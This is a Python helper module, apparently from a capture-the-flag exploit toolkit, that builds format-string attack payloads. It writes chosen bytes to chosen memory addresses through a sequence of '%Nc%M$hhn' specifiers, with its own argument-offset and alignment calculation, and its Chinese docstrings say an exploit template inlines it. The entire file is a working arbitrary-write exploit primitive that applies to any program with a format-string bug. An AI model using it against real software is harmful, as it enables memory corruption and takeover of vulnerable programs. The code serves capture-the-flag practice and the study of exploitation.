#!/usr/bin/env python3
"""格式化字符串 %hhn 分块写：自己算参数位，不依赖 pwntools 的 fmtstr_payload。

为什么不用 `fmtstr_payload`：实测 `challenges/fmtstr`（非 PIE、secret==0xdeadbeef）
用 `%6$p` 能确认缓冲区开头就是第 6 个参数，但 `fmtstr_payload(6, {0x40406c: 0xdeadbeef})`
生成的却是 `%13$hn/%14$hn` —— 地址实际落在第 9/10 个参数，写入落到了错误地址。
本模块把这件事算清楚，逻辑透明、可单元测试：

    布局 = [格式串][用 pad_byte 补齐到 8 字节对齐][地址槽 0][地址槽 1]...

- 每个目标字节用一次 `%<pad>c%<idx>$hhn` 写，`idx` 是该字节地址所在槽的参数位；
- 按"目标字节值升序"排列，保证已打印字符数单调递增（%hhn 取的是累计计数 & 0xff）；
- 第一个地址槽的参数位 = offset + 对齐后格式串长度 // 8。长度会随参数位位数变化，
  所以迭代到稳定（最多 5 轮）。

本函数被 exploit 模板用 inspect.getsource() 内联进生成的脚本，因此这里只允许依赖
脚本里已有的 p32/p64/u64（pwntools），不要引入其它导入。
"""


def build_payload(offset, writes, bit=64, max_bytes=6, pad_byte=b'A'):
    """构造 `%hhn` 写入 payload。

    offset: 我们输入的缓冲区开头是第几个格式化参数（用 %N$p 探测得到）
    writes: {目标地址: 目标值}
    bit:    目标架构位宽（64 → 每个地址槽 8 字节，32 → 4 字节）
    max_bytes: 每个目标值最多写几个字节（值很大时按需增加，6 字节够表达 libc 偏移）
    返回 payload 字节串。
    """
    slot = 8 if bit == 64 else 4
    packer = (lambda v: v.to_bytes(slot, 'little'))
    if bit == 64:
        packer = lambda v: v.to_bytes(slot, 'little')  # noqa: E731

    # 展开成 (地址, 目标字节值)
    items = []
    for addr, value in writes.items():
        nbytes = 1
        while nbytes < max_bytes and (value >> (8 * nbytes)):
            nbytes += 1
        for i in range(nbytes):
            items.append((addr + i, (value >> (8 * i)) & 0xff))
    if not items:
        return b''
    items.sort(key=lambda x: x[1])

    fmt_text = b''
    aligned_len = 0
    printed = 0
    for _ in range(5):
        parts = []
        printed = 0
        for idx_addr, (addr, target_byte) in enumerate(items):
            arg = offset + (aligned_len // slot) + idx_addr
            pad = target_byte - printed
            if pad < 0:
                pad += 256
            if pad:
                parts.append(b'%' + str(pad).encode() + b'c')
            parts.append(b'%' + str(arg).encode() + b'$hhn')
            printed = (printed + pad) & 0xff
        fmt_text = b''.join(parts)
        new_aligned = ((len(fmt_text) + slot - 1) // slot) * slot
        if new_aligned == aligned_len:
            break
        aligned_len = new_aligned

    padding = pad_byte * (aligned_len - len(fmt_text))
    addrs = b''.join(packer(addr) for addr, _ in items)
    return fmt_text + padding + addrs


def describe(offset, writes, bit=64, **kwargs):
    """返回 (payload, 说明文本)，便于日志里核对参数位是否算对。"""
    payload = build_payload(offset, writes, bit=bit, **kwargs)
    slot = 8 if bit == 64 else 4
    indices = []
    for m in __import__('re').finditer(rb'%(\d+)\$hhn', payload):
        indices.append(int(m.group(1)))
    return payload, f'长度={len(payload)} 参数位={indices}'
